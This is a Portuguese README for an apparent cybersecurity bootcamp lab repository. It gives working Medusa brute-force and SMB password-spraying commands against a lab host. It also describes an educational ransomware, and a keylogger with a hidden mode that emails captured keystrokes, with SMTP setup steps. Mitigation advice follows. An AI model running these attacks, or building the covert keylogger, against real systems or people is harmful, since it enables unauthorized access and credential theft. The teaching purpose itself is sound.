# Bootcamp Cibersegurança - DIO

## 📋 Descrição dos Desafios

Este repositório documenta projetos práticos de cibersegurança desenvolvidos durante o Bootcamp, abrangendo ataques de força bruta, desenvolvimento de malwares educacionais e keyloggers para fins de aprendizado em ambientes controlados.

---

## 🎯 Projeto 1: Ataque Brute Force com Medusa e Kali Linux

### Descrição

Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

### Objetivos de Aprendizagem

Ao concluir este desafio, você será capaz de:

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências

### Requisitos do Projeto

#### Configuração do Ambiente

- Duas VMs (Kali Linux e Metasploitable 2) no VirtualBox
- Configuração de rede interna (host-only)

#### Ataques Simulados

1. Força bruta em FTP
2. Automação de tentativas em formulário web (DVWA)
3. Password spraying em SMB com enumeração de usuários

### Comandos Utilizados

#### 1. Reconhecimento e Enumeração

```bash
# Scan de portas e serviços
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

```bash
# Enumeração com enum4linux
enum4linux -a 192.168.56.101 | tee enum4_output.txt
less enum4_output.txt
```

#### 2. Preparação das Wordlists

```bash
# Criação da lista de usuários
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

```bash
# Criação da lista de senhas
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

```bash
# Lista de usuários SMB
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
```

```bash
# Lista de senhas para spray
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```

#### 3. Ataques com Medusa

##### Ataque FTP

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

##### Ataque HTTP (DVWA)

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

##### Password Spraying SMB

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

---

## 🦠 Projeto 2: Desenvolvimento de Malware Educacional (Ransomware)

### Descrição

Implementação de um ransomware educacional em Python para demonstrar como ataques de criptografia de arquivos funcionam e como se proteger contra eles.

### Objetivos de Aprendizagem

- Compreender o funcionamento de ransomwares
- Aprender técnicas de criptografia com Python
- Entender o ciclo de ataque: criptografia e descriptografia
- Reconhecer padrões de malware para melhor defesa

### Componentes Desenvolvidos

#### 1. Ransomware (ransoware.py)

```python
# Funcionalidades principais:
- Geração de chave de criptografia (Fernet)
- Busca recursiva de arquivos no diretório alvo
- Criptografia de arquivos (exceto .py e .key)
- Criação de nota de resgate
```

#### 2. Script de Descriptografia (descrypt.py)

```python
# Funcionalidades principais:
- Carregamento da chave de descriptografia
- Busca automática de arquivos criptografados
- Descriptografia segura com tratamento de erros
- Validação de recuperação dos arquivos
```

### Instalação de Dependências

```bash
pip install cryptography
```

### Uso Responsável

```bash
# Ambiente controlado (test_files/)
python ransoware.py    # Criptografa arquivos
python descrypt.py     # Descriptografa arquivos
```

---

## ⌨️ Projeto 3: Desenvolvimento de Keylogger Educacional

### Descrição

Implementação de um keylogger em Python para fins educacionais, demonstrando como essas ferramentas capturam entradas do teclado e como se proteger.

### Objetivos de Aprendizagem

- Entender o funcionamento de keyloggers
- Aprender técnicas de monitoramento de entrada
- Reconhecer sinais de comprometimento
- Implementar medidas de proteção

### Componentes do Keylogger

#### keylogger.py (Modo Visível)
```python
# Funcionalidades:
- Captura de teclas digitadas em tempo real
- Filtro de teclas especiais (Shift, Ctrl, Alt)
- Registro em arquivo de log
- Tratamento de teclas especiais (Space, Enter, Backspace)
- Executa com console visível (para testes e debug)
```

#### keylogger.pyw (Modo Invisível)
```python
# Funcionalidades:
- Mesmas funcionalidades do keylogger.py
- Executa SEM abrir janela de console (background)
- Extensão .pyw é específica do Windows
- Ideal para demonstrar como keyloggers reais operam de forma oculta
- ⚠️ Use apenas em ambiente controlado e com autorização
```

#### keylogger_email.py (Com Envio por Email)
```python
# Funcionalidades avançadas:
- Todas as funcionalidades do keylogger.py
- Envio automático de logs por email via SMTP
- Suporte a Proton Mail (smtp.protonmail.ch)
- Envio periódico configurável (padrão: 5 minutos)
- Buffer em memória para otimizar envios
- Backup local em caso de falha no envio
- Usa threading para não bloquear captura de teclas
- Formato de email profissional com timestamp
```

### Instalação de Dependências

```bash
pip install pynput
```

### Uso em Ambiente Controlado

```bash
# Modo visível (com console)
python keylogger.py
# Pressione Ctrl+C para encerrar

# Modo invisível (sem console - Windows)
pythonw keylogger.pyw
# ou simplesmente clique duas vezes no arquivo .pyw
# Para encerrar: use Task Manager ou taskkill

# Com envio por email (configure credenciais primeiro!)
python keylogger_email.py
# Edite as linhas 11-13 com suas credenciais do Proton Mail
```

### Configuração do Keylogger com Email

Para usar o `keylogger_email.py`, configure as seguintes variáveis no início do arquivo:

```python
# Escolha seu provedor de email e configure:

# Gmail
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "seu_email@gmail.com"
EMAIL_PASSWORD = "sua_senha_de_aplicativo"  # Veja instruções abaixo

# Outlook/Hotmail
SMTP_SERVER = "smtp.office365.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "seu_email@outlook.com"
EMAIL_PASSWORD = "sua_senha_de_aplicativo"

# Proton Mail
SMTP_SERVER = "smtp.protonmail.ch"
SMTP_PORT = 587
EMAIL_ADDRESS = "seu_email@proton.me"
EMAIL_PASSWORD = "sua_senha_de_aplicativo"

# Yahoo
SMTP_SERVER = "smtp.mail.yahoo.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "seu_email@yahoo.com"
EMAIL_PASSWORD = "sua_senha_de_aplicativo"

# Configuração do destinatário
DESTINATION_EMAIL = "destino@exemplo.com"  # Email que receberá os logs
SEND_INTERVAL = 300  # Intervalo em segundos (300 = 5 minutos)
```

#### Como Obter Senha de Aplicativo

**Gmail:**
1. Ative a verificação em duas etapas na sua conta Google
2. Acesse: [myaccount.google.com/apppasswords](https://myaccount.google.com/apppasswords)
3. Selecione "App" → "Outro" → Digite "Keylogger"
4. Copie a senha de 16 caracteres gerada

**Outlook/Hotmail:**
1. Acesse: [account.microsoft.com/security](https://account.microsoft.com/security)
2. Clique em "Opções de segurança avançadas"
3. Em "Senhas de aplicativo", clique em "Criar uma nova senha"
4. Use a senha gerada

**Proton Mail:**
1. Acesse Settings → Security → Two-factor authentication
2. Clique em "App passwords"
3. Crie uma nova senha de aplicativo
4. Use a senha gerada

**Yahoo:**
1. Acesse: [login.yahoo.com/account/security](https://login.yahoo.com/account/security)
2. Clique em "Gerar senha de aplicativo"
3. Selecione "Outro aplicativo" e digite "Keylogger"
4. Use a senha gerada

**Recomendações de Segurança:**

- **NUNCA use sua senha principal do email** - sempre use senhas de aplicativo
- Use emails de teste dedicados para este projeto educacional
- Adicione credenciais ao `.gitignore` se configurar o arquivo
- Considere usar variáveis de ambiente para armazenar credenciais
- Revogue senhas de aplicativo após concluir os testes

### Diferença entre as Versões

| Aspecto | keylogger.py | keylogger.pyw | keylogger_email.py |
|---------|--------------|---------------|-------------------|
| **Console** | Visível | Invisível | Visível |
| **Execução** | `python keylogger.py` | `pythonw keylogger.pyw` | `python keylogger_email.py` |
| **Salvamento** | Arquivo local | Arquivo local | Local + Email |
| **Envio Remoto** | ❌ Não | ❌ Não | ✅ Sim (SMTP) |
| **Uso** | Debug e testes | Demonstração realista | Demonstração completa |
| **Detecção** | Facilmente visível | Executa em background | Visível + tráfego de rede |
| **Plataforma** | Todas | Windows apenas | Todas |
| **Dependências** | pynput | pynput | pynput + smtplib |

---

## 📝 Estrutura do Repositório

```
.
├── README.md
├── Medusa_BruteForce/
│   ├── wordlists/
│   │   ├── users.txt
│   │   ├── pass.txt
│   │   ├── smb_users.txt
│   │   └── senhas_spray.txt
│   └── images/
├── Malwares & Ransowares/
│   └── Malware/
│       ├── ransoware.py
│       ├── descrypt.py
│       ├── chave.key
│       └── test_files/
└── Keylogger/
    ├── keylogger.py
    ├── keylogger.pyw
    ├── keylogger_email.py
    └── keylog.txt
```

## ⚠️ Aviso Legal

Este projeto é exclusivamente para fins educacionais e deve ser executado apenas em ambientes controlados e autorizados. O uso dessas técnicas em sistemas sem autorização é ilegal e antiético.

## 🛡️ Medidas de Mitigação e Proteção

### Proteção contra Ataques de Força Bruta

#### 1. FTP (File Transfer Protocol)
- **Desabilitar login root**: Nunca permitir acesso FTP com usuário root
- **Implementar fail2ban**: Bloquear IPs após múltiplas tentativas falhas
- **Usar FTPS ou SFTP**: Sempre preferir versões seguras do protocolo
- **Políticas de senha forte**: Exigir senhas complexas (mínimo 12 caracteres, combinando letras, números e símbolos)
- **Limitar tentativas de login**: Configurar delays progressivos entre tentativas
- **Whitelist de IPs**: Restringir acesso apenas a IPs conhecidos quando possível

#### 2. Aplicações Web (HTTP/DVWA)
- **CAPTCHA**: Implementar após 3-5 tentativas falhas de login
- **Rate limiting**: Limitar número de requisições por IP/usuário
- **Autenticação multifator (MFA)**: Adicionar segunda camada de autenticação
- **Account lockout**: Bloquear conta temporariamente após tentativas falhas
- **Logs e monitoramento**: Registrar todas as tentativas de login e implementar alertas
- **Tokens CSRF**: Prevenir ataques automatizados em formulários
- **WAF (Web Application Firewall)**: Detectar e bloquear padrões de ataque

#### 3. SMB (Server Message Block)
- **Desabilitar SMBv1**: Usar apenas versões mais seguras (SMBv2/SMBv3)
- **Políticas de grupo**: Implementar bloqueio de conta no Active Directory
- **Senhas complexas**: Evitar senhas padrão e senhas fracas
- **Auditoria de usuários**: Remover contas inativas e desnecessárias
- **Segmentação de rede**: Isolar serviços críticos em VLANs separadas
- **Monitoramento de eventos**: Alertar sobre tentativas de autenticação suspeitas
- **Least privilege**: Aplicar princípio do menor privilégio necessário

### Boas Práticas Gerais

- **Atualizações regulares**: Manter sistemas e aplicações sempre atualizados
- **Treinamento de usuários**: Educar sobre senhas seguras e phishing
- **Backup regular**: Manter backups atualizados e testados
- **Análise de vulnerabilidades**: Realizar testes de penetração periódicos
- **Princípio de defesa em profundidade**: Múltiplas camadas de segurança

## 🔗 Recursos Úteis

### Documentações Oficiais

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Proton Mail](https://proton.me/) - Email seguro para testes
- [Python pynput Documentation](https://pynput.readthedocs.io/)
- [Python smtplib Documentation](https://docs.python.org/3/library/smtplib.html)

## 📚 Referências

- DIO - Digital Innovation One

---

**Desenvolvido como parte do Bootcamp Ciber Segurança DIO**